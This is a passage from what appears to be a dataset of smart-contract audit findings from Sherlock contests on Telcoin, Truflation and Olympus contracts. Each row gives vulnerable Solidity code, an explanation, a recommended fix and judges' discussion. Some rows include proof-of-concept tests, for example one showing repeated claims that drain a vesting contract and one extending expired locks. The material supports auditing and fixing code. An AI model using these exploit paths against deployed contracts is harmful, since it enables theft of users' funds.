balances length will revert.\nSubsequent mint operations will revert due to `tokenId` collision. As `totalSupply` now collides with the existing `tokenId`.\nThis mismanagement creates a cascading effect, collectively rendering the contract inoperable. Following POC will demonstrate the issue more clearly in codes.\nPOC\nRun `git apply` on the following patch then run `npx hardhat test` to run the POC.\n```\ndiff --git a/telcoin-audit/test/sablier/CouncilMember.test.ts b/telcoin-audit/test/sablier/CouncilMember.test.ts\nindex 675b89d..ab96b08 100644\n--- a/telcoin-audit/test/sablier/CouncilMember.test.ts\n+++ b/telcoin-audit/test/sablier/CouncilMember.test.ts\n@@ -1,13 +1,14 @@\n import { expect } from ""chai"";\n import { ethers } from ""hardhat"";\n import { SignerWithAddress } from ""@nomicfoundation/hardhat-ethers/signers"";\n-import { CouncilMember, TestTelcoin, TestStream } from ""../../typechain-types"";\n+import { CouncilMember, TestTelcoin, TestStream, ERC721Upgradeable__factory } from ""../../typechain-types"";\n \n describe(""CouncilMember"", () => {\n     let admin: SignerWithAddress;\n     let support: SignerWithAddress;\n     let member: SignerWithAddress;\n     let holder: SignerWithAddress;\n+    let lastCouncilMember: SignerWithAddress;\n     let councilMember: CouncilMember;\n     let telcoin: TestTelcoin;\n     let stream: TestStream;\n@@ -18,7 +19,7 @@ describe(""CouncilMember"", () => {\n     let supportRole: string = ethers.keccak256(ethers.toUtf8Bytes(""SUPPORT_ROLE""));\n \n     beforeEach(async () => {\n-        [admin, support, member, holder, target] = await ethers.getSigners();\n+        [admin, support, member, holder, target, lastCouncilMember] = await ethers.getSigners();\n \n         const TestTelcoinFactory = await ethers.getContractFactory(""TestTelcoin"", admin);\n         telcoin = await TestTelcoinFactory.deploy(admin.address);\n@@ -182,6 +183,22 @@ describe(""CouncilMember"", () => {\n                 it(""the correct removal is made"", async () => {\n                     await expect(councilMember.burn(1, support.address)).emit(councilMember, ""Transfer"");\n                 });\n+                it.only(""inoperable contract after burn"", async () => {\n+                    await expect(councilMember.mint(lastCouncilMember.address)).to.not.reverted;\n+\n+                    // This 1st burn will cause contract inoperable due to tokenId & balances misalignment\n+                    await expect(councilMember.burn(1, support.address)).emit(councilMember, ""Transfer"");\n+\n+                    // Impact 1. holder with tokenId > balances length cannot claim\n+                    await expect(councilMember.connect(lastCouncilMember).claim(3, 1)).to.revertedWithPanic(""0x32""); // @audit-info 0x32: Array accessed at an out-of-bounds or negative index\n+\n+                    // Impact 2. subsequent burns of tokenId > balances length will revert\n+                    await expect(councilMember.burn(3, lastCouncilMember.address)).to.revertedWithPanic(""0x32""); \n+\n+                    // Impact 3. subsequent mint will revert due to tokenId collision\n+                    await expect(councilMember.mint(lastCouncilMember.address)).to.revertedWithCustomError(councilMember, ""ERC721InvalidSender"");\n+\n+                });\n             });\n         });\n \n```\n\nResult\nCouncilMember mutative burn Success ✔ inoperable contract after burn (90ms) 1 passing (888ms)\nThe Passing execution of the POC confirmed that operations such as `claim`, `burn` & `mint` were all reverted which make the contract inoperable."ч
Users can fully drain the `TrufVesting` contractчhighч```\n    function claimable(uint256 categoryId, uint256 vestingId, address user)\n        public\n        view\n        returns (uint256 claimableAmount)\n    {\n        UserVesting memory userVesting = userVestings[categoryId][vestingId][user];\n\n        VestingInfo memory info = vestingInfos[categoryId][vestingId];\n\n        uint64 startTime = userVesting.startTime + info.initialReleasePeriod;\n\n        if (startTime > block.timestamp) {\n            return 0;\n        }\n\n        uint256 totalAmount = userVesting.amount;\n\n        uint256 initialRelease = (totalAmount * info.initialReleasePct) / DENOMINATOR;\n\n        startTime += info.cliff;\n\n        if (startTime > block.timestamp) {\n            return initialRelease;\n        }\n```\nчDue to flaw in the logic in `claimable` any arbitrary user can drain all the funds within the contract.\nA user's claimable is calculated in the following way:\nUp until start time it is 0.\nBetween start time and cliff time it's equal to `initialRelease`.\nAfter cliff time, it linearly increases until the full period ends.\nHowever, if we look at the code, when we are at stage 2., it always returns `initialRelease`, even if we've already claimed it. This would allow for any arbitrary user to call claim as many times as they wish and every time they'd receive `initialRelease`. Given enough iterations, any user can drain the contract.\n```\n    function claimable(uint256 categoryId, uint256 vestingId, address user)\n        public\n        view\n        returns (uint256 claimableAmount)\n    {\n        UserVesting memory userVesting = userVestings[categoryId][vestingId][user];\n\n        VestingInfo memory info = vestingInfos[categoryId][vestingId];\n\n        uint64 startTime = userVesting.startTime + info.initialReleasePeriod;\n\n        if (startTime > block.timestamp) {\n            return 0;\n        }\n\n        uint256 totalAmount = userVesting.amount;\n\n        uint256 initialRelease = (totalAmount * info.initialReleasePct) / DENOMINATOR;\n\n        startTime += info.cliff;\n\n        if (startTime > block.timestamp) {\n            return initialRelease;\n        }\n```\n\n```\n    function claim(address user, uint256 categoryId, uint256 vestingId, uint256 claimAmount) public {\n        if (user != msg.sender && (!categories[categoryId].adminClaimable || msg.sender != owner())) {\n            revert Forbidden(msg.sender);\n        }\n\n        uint256 claimableAmount = claimable(categoryId, vestingId, user);\n        if (claimAmount == type(uint256).max) {\n            claimAmount = claimableAmount;\n        } else if (claimAmount > claimableAmount) {\n            revert ClaimAmountExceed();\n        }\n        if (claimAmount == 0) {\n            revert ZeroAmount();\n        }\n\n        categories[categoryId].totalClaimed += claimAmount;\n        userVestings[categoryId][vestingId][user].claimed += claimAmount;\n        trufToken.safeTransfer(user, claimAmount);\n\n        emit Claimed(categoryId, vestingId, user, claimAmount);\n    }\n```\nч
`cancelVesting` will potentially not give users unclaimed, vested funds, even if giveUnclaimed = trueчhighч```\nfunction cancelVesting(uint256 categoryId, uint256 vestingId, address user, bool giveUnclaimed)\n        external\n        onlyOwner\n{\n        UserVesting memory userVesting = userVestings[categoryId][vestingId][user];\n\n        if (userVesting.amount == 0) {\n            revert UserVestingDoesNotExists(categoryId, vestingId, user);\n        }\n\n        if (userVesting.startTime + vestingInfos[categoryId][vestingId].period <= block.timestamp) {\n            revert AlreadyVested(categoryId, vestingId, user);\n        }\n\n        uint256 lockupId = lockupIds[categoryId][vestingId][user];\n\n        if (lockupId != 0) {\n            veTRUF.unstakeVesting(user, lockupId - 1, true);\n            delete lockupIds[categoryId][vestingId][user];\n            userVesting.locked = 0;\n        }\n\n        VestingCategory storage category = categories[categoryId];\n\n        uint256 claimableAmount = claimable(categoryId, vestingId, user);\n        if (giveUnclaimed && claimableAmount != 0) {\n            trufToken.safeTransfer(user, claimableAmount);\n\n            userVesting.claimed += claimableAmount;\n            category.totalClaimed += claimableAmount;\n            emit Claimed(categoryId, vestingId, user, claimableAmount);\n        }\n\n        uint256 unvested = userVesting.amount - userVesting.claimed;\n\n        delete userVestings[categoryId][vestingId][user];\n\n        category.allocated -= unvested;\n\n        emit CancelVesting(categoryId, vestingId, user, giveUnclaimed);\n}\n```\nчThe purpose of `cancelVesting` is to cancel a vesting grant and potentially give users unclaimed but vested funds in the event that `giveUnclaimed = true`. However, due to a bug, in the event that the user had staked / locked funds, they will potentially not received the unclaimed / vested funds even if `giveUnclaimed = true`.\nHere's the cancelVesting function in TrufVesting:\n```\nfunction cancelVesting(uint256 categoryId, uint256 vestingId, address user, bool giveUnclaimed)\n        external\n        onlyOwner\n{\n        UserVesting memory userVesting = userVestings[categoryId][vestingId][user];\n\n        if (userVesting.amount == 0) {\n            revert UserVestingDoesNotExists(categoryId, vestingId, user);\n        }\n\n        if (userVesting.startTime + vestingInfos[categoryId][vestingId].period <= block.timestamp) {\n            revert AlreadyVested(categoryId, vestingId, user);\n        }\n\n        uint256 lockupId = lockupIds[categoryId][vestingId][user];\n\n        if (lockupId != 0) {\n            veTRUF.unstakeVesting(user, lockupId - 1, true);\n            delete lockupIds[categoryId][vestingId][user];\n            userVesting.locked = 0;\n        }\n\n        VestingCategory storage category = categories[categoryId];\n\n        uint256 claimableAmount = claimable(categoryId, vestingId, user);\n        if (giveUnclaimed && claimableAmount != 0) {\n            trufToken.safeTransfer(user, claimableAmount);\n\n            userVesting.claimed += claimableAmount;\n            category.totalClaimed += claimableAmount;\n            emit Claimed(categoryId, vestingId, user, claimableAmount);\n        }\n\n        uint256 unvested = userVesting.amount - userVesting.claimed;\n\n        delete userVestings[categoryId][vestingId][user];\n\n        category.allocated -= unvested;\n\n        emit CancelVesting(categoryId, vestingId, user, giveUnclaimed);\n}\n```\n\nFirst, consider the following code:\n```\nuint256 lockupId = lockupIds[categoryId][vestingId][user];\n\nif (lockupId != 0) {\n            veTRUF.unstakeVesting(user, lockupId - 1, true);\n            delete lockupIds[categoryId][vestingId][user];\n            userVesting.locked = 0;\n}\n```\n\nFirst the locked / staked funds will essentially be un-staked. The following line of code: `userVesting.locked = 0;` exists because there is a call to `uint256 claimableAmount = claimable(categoryId, vestingId, user);` afterwards, and in the event that there were locked funds that were unstaked, these funds should now potentially be `claimable` if they are vested (but if locked is not set to 0, then the vested funds will potentially not be deemed `claimable` by the `claimable` function).\nHowever, because `userVesting` is `memory` rather than `storage`, this doesn't end up happening (so `userVesting.locked = 0;` is actually a bug). This means that if a user is currently staking all their funds (so all their funds are locked), and `cancelVesting` is called, then they will not receive any funds back even if `giveUnclaimed = true`. This is because the `claimable` function (which will access the unaltered userVestings[categoryId][vestingId][user]) will still think that all the funds are currently locked, even though they are not as they have been forcibly unstaked.чChange `userVesting.locked = 0;` to `userVestings[categoryId][vestingId][user].locked = 0;`\nDiscussion\nryuheimat\nFixed. Updated `userVesting` type to storage type to fix https://github.com/sherlock-audit/2023-12-truflation-judging/issues/192 Considered initial release period and cliff for vesting end validation to fix https://github.com/sherlock-audit/2023-12-truflation-judging/issues/11\nExtra: Added `admin` permission, and allow several admins to be able to set vesting info and user vestings. https://github.com/truflation/truflation-contracts/pull/4\nmstpr\nFix and new admin functionality LGTM\nryuheimat\nFix and new admin functionality LGTM\nThank you, merging PR.чWhen `cancelVesting` is called, a user may not receive their unclaimed, vested funds.\nCode Snippet\nTool used\nManual Review
When migrating the owner users will lose their rewardsчmediumч```\n    /**\n     * @notice Migrate owner of vesting. Used when user lost his private key\n     * @dev Only admin can migrate users vesting\n     * @param categoryId Category id\n     * @param vestingId Vesting id\n     * @param prevUser previous user address\n     * @param newUser new user address\n     */\n```\nчWhen a user migrates the owner due to a lost private key, the rewards belonging to the previous owner remain recorded in their account and cannot be claimed, resulting in the loss of user rewards.\nAccording to the documentation, `migrateUser()` is used when a user loses their private key to migrate the old vesting owner to a new owner.\n```\n    /**\n     * @notice Migrate owner of vesting. Used when user lost his private key\n     * @dev Only admin can migrate users vesting\n     * @param categoryId Category id\n     * @param vestingId Vesting id\n     * @param prevUser previous user address\n     * @param newUser new user address\n     */\n```\n\nIn this function, the protocol calls `migrateVestingLock()` to obtain a new ID.\n```\n    if (lockupId != 0) {\n            newLockupId = veTRUF.migrateVestingLock(prevUser, newUser, lockupId - 1) + 1;\n            lockupIds[categoryId][vestingId][newUser] = newLockupId;\n            delete lockupIds[categoryId][vestingId][prevUser];\n\n            newVesting.locked = prevVesting.locked;\n        }\n```\n\nHowever, in the `migrateVestingLock()` function, the protocol calls `stakingRewards.withdraw()` to withdraw the user's stake, burning points. In the `withdraw()` function, the protocol first calls `updateReward()` to update the user's rewards and records them in the user's account.\n```\n    function withdraw(address user, uint256 amount) public updateReward(user) onlyOperator {\n        if (amount == 0) {\n            revert ZeroAmount();\n        }\n        _totalSupply -= amount;\n        _balances[user] -= amount;\n        emit Withdrawn(user, amount);\n    }\n```\n\nHowever, `stakingRewards.withdraw()` is called with the old owner as a parameter, meaning that the rewards will be updated on the old account.\n```\n  uint256 points = oldLockup.points;\n        stakingRewards.withdraw(oldUser, points);\n        _burn(oldUser, points);\n```\n\nAs mentioned earlier, the old owner has lost their private key and cannot claim the rewards, resulting in the loss of these rewards.ч
Ended locks can be extendedчmediumч"```\nfunction test_ExtendLock_AlreadyEnded() external {\n        uint256 amount = 100e18;\n        uint256 duration = 5 days;\n\n        _stake(amount, duration, alice, alice);\n\n        // 5 days later, lock is ended for Alice\n        skip(5 days + 1);\n\n        (,, uint128 _ends,,) = veTRUF.lockups(alice, 0);\n\n        // Alice's lock is indeed ended\n        assertTrue(_ends < block.timestamp, ""lock is ended"");\n\n        // 36 days passed  \n        skip(36 days);\n\n        // Alice extends her already finished lock 30 more days\n        vm.prank(alice);\n        veTRUF.extendLock(0, 30 days);\n\n        (,,_ends,,) = veTRUF.lockups(alice, 0);\n\n        // Alice's lock can be easily unlocked right away\n        assertTrue(_ends < block.timestamp, ""lock is ended"");\n\n        // Alice unstakes her lock, basically alice can unstake her lock anytime she likes\n        vm.prank(alice);\n        veTRUF.unstake(0);\n    }\n```\n"ч"When a lock period ends, it can be extended. If the new extension 'end' is earlier than the current block.timestamp, the user will have a lock that can be unstaked at any time.""\nWhen the lock period ends, the owner of the expired lock can extend it to set a new lock end that is earlier than the current block.timestamp. By doing so, the lock owner can create a lock that is unstakeable at any time.\nThis is doable because there are no checks in the extendLock function that checks whether the lock is already ended or not.\nPoC:\n```\nfunction test_ExtendLock_AlreadyEnded() external {\n        uint256 amount = 100e18;\n        uint256 duration = 5 days;\n\n        _stake(amount, duration, alice, alice);\n\n        // 5 days later, lock is ended for Alice\n        skip(5 days + 1);\n\n        (,, uint128 _ends,,) = veTRUF.lockups(alice, 0);\n\n        // Alice's lock is indeed ended\n        assertTrue(_ends < block.timestamp, ""lock is ended"");\n\n        // 36 days passed  \n        skip(36 days);\n\n        // Alice extends her already finished lock 30 more days\n        vm.prank(alice);\n        veTRUF.extendLock(0, 30 days);\n\n        (,,_ends,,) = veTRUF.lockups(alice, 0);\n\n        // Alice's lock can be easily unlocked right away\n        assertTrue(_ends < block.timestamp, ""lock is ended"");\n\n        // Alice unstakes her lock, basically alice can unstake her lock anytime she likes\n        vm.prank(alice);\n        veTRUF.unstake(0);\n    }\n```\n"ч"Do not let extension of locks that are already ended.\nDiscussion\nryuheimat\nhttps://github.com/truflation/truflation-contracts/pull/7 Disable to extend lock if already expired.\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\nShaheen commented:\nValid issue but Medium. Good Finding\nsecuritygrid\nEscalate I didn't sumbit this issue because I think this is not an issue: no funds loss, no core function broken. The reason is: Alice is still in the game and has not called `unstake` to exit the game.\nnevillehuang\n@ryuheimat I think @securitygrid has a point, and this seems similar to this issue here, might have slipped my judgement\nhttps://github.com/sherlock-audit/2023-12-truflation-judging/issues/169\nHowever both this and #169 indeed does break the ""locking"" mechanism, given it is expected that funds should be locked within escrows instead of allowing users to simply unlock immediately. I believe both should be at least medium/high severity issues, and could possibly be considered to be duplicates\nsherlock-admin2\nEscalate I didn't sumbit this issue because I think this is not an issue: no funds loss, no core function broken. The reason is: Alice is still in the game and has not called `unstake` to exit the game.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\ndetectiveking123\nThis is definitely a valid issue, but it is unclear to me whether it should be labeled as medium or high.\nCzar102\nI believe this is a valid medium. Core functionality – rewarding points for locking tokens – is broken.\nFrom my understanding, someone must have locked the tokens in the past and can receive points retroactively, meaning that they effectively can achieve flexible duration locks. This shouldn't be possible and is an important property of the system.\nCzar102\nAlso, I don't think #169 is a duplicate. Can you explain in more detail why would that be the case? @nevillehuang\nnevillehuang\n@Czar102 because they have the same impact, that is there is no “lock” required. I.e. User can gain rewards and retain voting power while still being able to unstake at any time.\nCzar102\nI see now. So effectively, the extension of the lock mentioned here doesn't matter since the identity locking receives points anyway?\nnevillehuang\n@Czar102 yes as long as the lock expires, the user will have no incentive to continue locking, and even if they do, they can unlock the lock at anytime as mentioned here. So I believe they should be duplicated as valid Medium severity.\nCzar102\nPlanning to duplicate these and make the severity Medium.\naslanbekaibimov\n@Czar102\nI see now. So effectively, the extension of the lock mentioned here doesn't matter since the identity locking receives points anyway?\nIt does matter. #82 describes how the user is able to have voting power greater than their original one, while always being able to withdraw. The fix is straightforward - to add a check for the lock's expiration.\nOn the other hand, #169 only allows users to keep their original voting power from the original lock. The fix of #82 also does not fix #169.\n0xunforgiven\nI don't believe they are duplicates. the only common thing between #82 and #169 is a precondition for the issues. they both happens when a lock expires. but impact and fix and bug place is totally different for them.\n#82 explains that after lock expires users can call extend lock and extend their lock. so the issue is in extend function and it can be fixed by simple check in extend function, but this fix won't fix the #169.\n#169 explains that after the lock expires users still have voting power and receive rewards. so the issue is in voting mechanism and reward distribution. this issue can't be fixed easily with current design. fixing this will not fix the #82.\nmultiple wardens reported these two as separate issues while some wardens missed one of them. issues can't be concluded from each other.\nmstpr\nFix LGTM\nryuheimat\nmstpr\nMerging...\nCzar102\nRemoving locks after they expire will both remove the voting power (locks don't exist anymore) and make it impossible to retroactively extend the lock (since any ended lock won't exist anymore). This is why I think these are duplicates.\n0xunforgiven\n@Czar102 regarding:\nRemoving locks after they expire\nin current code only the stacker can remove their own lock. so why should they remove their expired lock? this was their attack to not remove the expired lock and receive the rewards and voting power. he wouldn't remove his own lock(he is the one performing the attack) and as result receive rewards for his expired lock.\nthe sponsor in the https://github.com/sherlock-audit/2023-12-truflation-judging/issues/82#issuecomment-1882784243 says that their fix for extending expire lock is this:\nDisable to extend lock if already expired.\nso issue #169 still exists in the code.\nCzar102\nI agree it still exists. I still think these issues are duplicates, though instead of fixing the root cause #169, the sponsor decided to mitigate the implication of #169 described here, in #82.\nPlease note that the sponsor acknowledged an unfixed duplicate of this issue #169, which has a different impact.\nCzar102\nResult: Medium Has duplicates\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nsecuritygrid: accepted"ч"The owner of the lock will achieve points that he can unlock anytime. This is clearly a gaming of the system and shouldn't be acceptable behaviour. A locker having a ""lock"" that can be unstaked anytime will be unfair for the other lockers. Considering this, I'll label this as high.\nCode Snippet\nTool used\nManual Review"
OlympusPrice.v2.sol#storePrice: The moving average prices are used recursively for the calculation of the moving average price.чhighч```\n    function storePrice(address asset_) public override permissioned {\n        Asset storage asset = _assetData[asset_];\n\n        // Check if asset is approved\n        if (!asset.approved) revert PRICE_AssetNotApproved(asset_);\n\n        // Get the current price for the asset\n   (uint256 price, uint48 currentTime) = _getCurrentPrice(asset_);\n\n        // Store the data in the obs index\n        uint256 oldestPrice = asset.obs[asset.nextObsIndex];\n        asset.obs[asset.nextObsIndex] = price;\n\n        // Update the last observation time and increment the next index\n        asset.lastObservationTime = currentTime;\n        asset.nextObsIndex = (asset.nextObsIndex + 1) % asset.numObservations;\n\n        // Update the cumulative observation, if storing the moving average\n        if (asset.storeMovingAverage)\n       asset.cumulativeObs = asset.cumulativeObs + price - oldestPrice;\n\n        // Emit event\n        emit PriceStored(asset_, price, currentTime);\n    }\n```\nчThe moving average prices should be calculated by only oracle feed prices. But now, they are calculated by not only oracle feed prices but also moving average price recursively.\nThat is, the `storePrice` function uses the current price obtained from the `_getCurrentPrice` function to update the moving average price. However, in the case of `asset.useMovingAverage = true`, the `_getCurrentPrice` function computes the current price using the moving average price.\nThus, the moving average prices are used recursively to calculate moving average price, so the current prices will be obtained incorrectly.\n```\n    function storePrice(address asset_) public override permissioned {\n        Asset storage asset = _assetData[asset_];\n\n        // Check if asset is approved\n        if (!asset.approved) revert PRICE_AssetNotApproved(asset_);\n\n        // Get the current price for the asset\n   (uint256 price, uint48 currentTime) = _getCurrentPrice(asset_);\n\n        // Store the data in the obs index\n        uint256 oldestPrice = asset.obs[asset.nextObsIndex];\n        asset.obs[asset.nextObsIndex] = price;\n\n        // Update the last observation time and increment the next index\n        asset.lastObservationTime = currentTime;\n        asset.nextObsIndex = (asset.nextObsIndex + 1) % asset.numObservations;\n\n        // Update the cumulative observation, if storing the moving average\n        if (asset.storeMovingAverage)\n       asset.cumulativeObs = asset.cumulativeObs + price - oldestPrice;\n\n        // Emit event\n        emit PriceStored(asset_, price, currentTime);\n    }\n```\n\n`L319` obtain the current price for the asset by calling the `_getCurrentPrice` function and use it to update `asset.cumulativeObs` in `L331`. The `_getCurrentPrice` function is the following.\n```\n    function _getCurrentPrice(address asset_) internal view returns (uint256, uint48) {\n        Asset storage asset = _assetData[asset_];\n\n        // Iterate through feeds to get prices to aggregate with strategy\n        Component[] memory feeds = abi.decode(asset.feeds, (Component[]));\n        uint256 numFeeds = feeds.length;\n   uint256[] memory prices = asset.useMovingAverage\n            ? new uint256[](numFeeds + 1)\n            : new uint256[](numFeeds);\n        uint8 _decimals = decimals; // cache in memory to save gas\n        for (uint256 i; i < numFeeds; ) {\n            (bool success_, bytes memory data_) = address(_getSubmoduleIfInstalled(feeds[i].target))\n                .staticcall(\n                    abi.encodeWithSelector(feeds[i].selector, asset_, _decimals, feeds[i].params)\n                );\n\n            // Store price if successful, otherwise leave as zero\n            // Idea is that if you have several price calls and just\n            // one fails, it'll DOS the contract with this revert.\n            // We handle faulty feeds in the strategy contract.\n            if (success_) prices[i] = abi.decode(data_, (uint256));\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        // If moving average is used in strategy, add to end of prices array\n   if (asset.useMovingAverage) prices[numFeeds] = asset.cumulativeObs / asset.numObservations;\n\n        // If there is only one price, ensure it is not zero and return\n        // Otherwise, send to strategy to aggregate\n        if (prices.length == 1) {\n            if (prices[0] == 0) revert PRICE_PriceZero(asset_);\n            return (prices[0], uint48(block.timestamp));\n        } else {\n            // Get price from strategy\n            Component memory strategy = abi.decode(asset.strategy, (Component));\n            (bool success, bytes memory data) = address(_getSubmoduleIfInstalled(strategy.target))\n                .staticcall(abi.encodeWithSelector(strategy.selector, prices, strategy.params));\n\n            // Ensure call was successful\n            if (!success) revert PRICE_StrategyFailed(asset_, data);\n\n            // Decode asset price\n            uint256 price = abi.decode(data, (uint256));\n\n            // Ensure value is not zero\n            if (price == 0) revert PRICE_PriceZero(asset_);\n\n            return (price, uint48(block.timestamp));\n        }\n    }\n```\n\nAs can be seen, when `asset.useMovingAverage = true`, the `_getCurrentPrice` calculates the current `price` `price` using the moving average `price` obtained by `asset.cumulativeObs / asset.numObservations` in `L160`.\nSo the `price` value in `L331` is obtained from not only oracle feed prices but also moving average `price`. Then, `storePrice` calculates the cumulative observations asset.cumulativeObs = asset.cumulativeObs + `price` - oldestPrice using the `price` which is obtained incorrectly above.\nThus, the moving average prices are used recursively for the calculation of the moving average price.чSource: https://github.com/sherlock-audit/2023-11-olympus-judging/issues/55\nFound by\ndany.armstrong90, nirohgo, nobody2018\nWhen updating the current price and cumulative observations in the `storePrice` function, it should use the oracle price feeds and not include the moving average prices. So, instead of using the `asset.useMovingAverage` state variable in the `_getCurrentPrice` function, we can add a `useMovingAverage` parameter as the following.\n```\n  function _getCurrentPrice(address asset_, bool useMovingAverage) internal view returns (uint256, uint48) {\n        Asset storage asset = _assetData[asset_];\n\n        // Iterate through feeds to get prices to aggregate with strategy\n        Component[] memory feeds = abi.decode(asset.feeds, (Component[]));\n        uint256 numFeeds = feeds.length;\n      uint256[] memory prices = useMovingAverage\n            ? new uint256[](numFeeds + 1)\n            : new uint256[](numFeeds);\n        uint8 _decimals = decimals; // cache in memory to save gas\n        for (uint256 i; i < numFeeds; ) {\n            (bool success_, bytes memory data_) = address(_getSubmoduleIfInstalled(feeds[i].target))\n                .staticcall(\n                    abi.encodeWithSelector(feeds[i].selector, asset_, _decimals, feeds[i].params)\n                );\n\n            // Store price if successful, otherwise leave as zero\n            // Idea is that if you have several price calls and just\n            // one fails, it'll DOS the contract with this revert.\n            // We handle faulty feeds in the strategy contract.\n            if (success_) prices[i] = abi.decode(data_, (uint256));\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        // If moving average is used in strategy, add to end of prices array\n      if (useMovingAverage) prices[numFeeds] = asset.cumulativeObs / asset.numObservations;\n\n        // If there is only one price, ensure it is not zero and return\n        // Otherwise, send to strategy to aggregate\n        if (prices.length == 1) {\n            if (prices[0] == 0) revert PRICE_PriceZero(asset_);\n            return (prices[0], uint48(block.timestamp));\n        } else {\n            // Get price from strategy\n            Component memory strategy = abi.decode(asset.strategy, (Component));\n            (bool success, bytes memory data) = address(_getSubmoduleIfInstalled(strategy.target))\n                .staticcall(abi.encodeWithSelector(strategy.selector, prices, strategy.params));\n\n            // Ensure call was successful\n            if (!success) revert PRICE_StrategyFailed(asset_, data);\n\n            // Decode asset price\n            uint256 price = abi.decode(data, (uint256));\n\n            // Ensure value is not zero\n            if (price == 0) revert PRICE_PriceZero(asset_);\n\n            return (price, uint48(block.timestamp));\n        }\n    }\n```\n\nThen we should set `useMovingAverage = false` to call `_getCurrentPrice` function only in the `storePrice` function. In other cases, we should set `useMovingAverage = asset.useMovingAverage` to call `_getCurrentPrice` function.\nDiscussion\n0xrusowsky\nhttps://github.com/OlympusDAO/bophades/pull/257\nIAm0x52\nFix looks good. The moving average is no longer included when storing priceчNow the moving average prices are used recursively for the calculation of the moving average price. Then, the moving average prices become more smoothed than the intention of the administrator. That is, even when the actual price fluctuations are large, the price fluctuations of `_getCurrentPrice` function will become too small.\nMoreover, even though all of the oracle price feeds fails, the moving averge prices will be calculated only by moving average prices.\nThus the current prices will become incorrect. If `_getCurrentPrice` function value is miscalculated, it will cause fatal damage to the protocol.\nCode Snippet\nTool used\nManual Review
Incorrect ProtocolOwnedLiquidityOhm calculation due to inclusion of other user's reservesчhighч```\n    function getProtocolOwnedLiquidityOhm() external view override returns (uint256) {\n\n        uint256 len = bunniTokens.length;\n        uint256 total;\n        for (uint256 i; i < len; ) {\n            TokenData storage tokenData = bunniTokens[i];\n            BunniLens lens = tokenData.lens;\n            BunniKey memory key = _getBunniKey(tokenData.token);\n\n        // rest of code// rest of code// rest of code\n\n            total += _getOhmReserves(key, lens);\n            unchecked {\n                ++i;\n            }\n        }\n\n\n        return total;\n    }\n```\nчProtocolOwnedLiquidityOhm for Bunni can include the liquidity deposited by other users which is not protocol owned\nThe protocol owned liquidity in Bunni is calculated as the sum of reserves of all the BunniTokens\n```\n    function getProtocolOwnedLiquidityOhm() external view override returns (uint256) {\n\n        uint256 len = bunniTokens.length;\n        uint256 total;\n        for (uint256 i; i < len; ) {\n            TokenData storage tokenData = bunniTokens[i];\n            BunniLens lens = tokenData.lens;\n            BunniKey memory key = _getBunniKey(tokenData.token);\n\n        // rest of code// rest of code// rest of code\n\n            total += _getOhmReserves(key, lens);\n            unchecked {\n                ++i;\n            }\n        }\n\n\n        return total;\n    }\n```\n\nThe deposit function of Bunni allows any user to add liquidity to a token. Hence the returned reserve will contain amounts other than the reserves that actually belong to the protocol\n```\n    // @audit callable by any user\n    function deposit(\n        DepositParams calldata params\n    )\n        external\n        payable\n        virtual\n        override\n        checkDeadline(params.deadline)\n        returns (uint256 shares, uint128 addedLiquidity, uint256 amount0, uint256 amount1)\n    {\n    }\n```\nчGuard the deposit function in BunniHub or compute the liquidity using shares belonging to the protocol\nDiscussion\n0xJem\nThis is a good catch, and the high level is justified\n0xrusowsky\nhttps://github.com/OlympusDAO/bophades/pull/260\nIAm0x52\nFix looks good. OnlyOwner modifier has been added to depositsчIncorrect assumption of the protocol owned liquidity and hence the supply. An attacker can inflate the liquidity reserves The wider system relies on the supply calculation to be correct in order to perform actions of economical impact\n```\nhttps://discord.com/channels/812037309376495636/1184355501258047488/1184397904551628831\nit will be determined to get backing\nso it will have an economical impact, as we could be exchanging ohm for treasury assets at a wrong price\n```\n\nCode Snippet\nTool used\nManual Review
Incorrect StablePool BPT price calculationчhighч```\n    function getStablePoolTokenPrice(\n        address,\n        uint8 outputDecimals_,\n        bytes calldata params_\n    ) external view returns (uint256) {\n        // Prevent overflow\n        if (outputDecimals_ > BASE_10_MAX_EXPONENT)\n            revert Balancer_OutputDecimalsOutOfBounds(outputDecimals_, BASE_10_MAX_EXPONENT);\n\n\n        address[] memory tokens;\n        uint256 poolRate; // pool decimals\n        uint8 poolDecimals;\n        bytes32 poolId;\n        {\n\n        // rest of code// rest of code\n\n            // Get tokens in the pool from vault\n            (address[] memory tokens_, , ) = balVault.getPoolTokens(poolId);\n            tokens = tokens_;\n\n            // Get rate\n            try pool.getRate() returns (uint256 rate_) {\n                if (rate_ == 0) {\n                    revert Balancer_PoolStableRateInvalid(poolId, 0);\n                }\n\n\n                poolRate = rate_;\n\n        // rest of code// rest of code\n\n        uint256 minimumPrice; // outputDecimals_\n        {\n            /**\n             * The Balancer docs do not currently state this, but a historical version noted\n             * that getRate() should be multiplied by the minimum price of the tokens in the\n             * pool in order to get a valuation. This is the same approach as used by Curve stable pools.\n             */\n            for (uint256 i; i < len; i++) {\n                address token = tokens[i];\n                if (token == address(0)) revert Balancer_PoolTokenInvalid(poolId, i, token);\n\n                (uint256 price_, ) = _PRICE().getPrice(token, PRICEv2.Variant.CURRENT); // outputDecimals_\n\n\n                if (minimumPrice == 0) {\n                    minimumPrice = price_;\n                } else if (price_ < minimumPrice) {\n                    minimumPrice = price_;\n                }\n            }\n        }\n\n        uint256 poolValue = poolRate.mulDiv(minimumPrice, 10 ** poolDecimals); // outputDecimals_\n```\nчIncorrect StablePool BPT price calculation as rate's are not considered\nThe price of a stable pool BPT is computed as:\nminimum price among the pool tokens obtained via feeds * return value of `getRate()`\nThis method is used referring to an old documentation of Balancer\n```\n    function getStablePoolTokenPrice(\n        address,\n        uint8 outputDecimals_,\n        bytes calldata params_\n    ) external view returns (uint256) {\n        // Prevent overflow\n        if (outputDecimals_ > BASE_10_MAX_EXPONENT)\n            revert Balancer_OutputDecimalsOutOfBounds(outputDecimals_, BASE_10_MAX_EXPONENT);\n\n\n        address[] memory tokens;\n        uint256 poolRate; // pool decimals\n        uint8 poolDecimals;\n        bytes32 poolId;\n        {\n\n        // rest of code// rest of code\n\n            // Get tokens in the pool from vault\n            (address[] memory tokens_, , ) = balVault.getPoolTokens(poolId);\n            tokens = tokens_;\n\n            // Get rate\n            try pool.getRate() returns (uint256 rate_) {\n                if (rate_ == 0) {\n                    revert 